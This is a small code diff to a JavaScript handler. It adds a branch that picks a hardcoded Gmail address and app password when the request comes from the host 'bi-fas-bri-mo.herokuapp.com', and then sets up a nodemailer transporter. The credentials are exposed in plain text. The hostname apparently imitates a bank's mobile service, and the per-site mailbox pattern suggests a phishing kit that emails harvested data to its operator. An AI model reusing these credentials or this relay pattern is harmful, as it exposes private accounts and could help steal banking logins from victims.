@@ -49,6 +49,11 @@ export default function handler(req, res) {
     pass = 'xbohxjweimfcuhpx';
    
     }
+    else if (url == 'bi-fas-bri-mo.herokuapp.com'){
+        email = 'borosss940@gmail.com';
+        pass = 'limdsccatyovxtxk';
+       
+        }
         
         try {
             const transporter = nodemailer.createTransport({
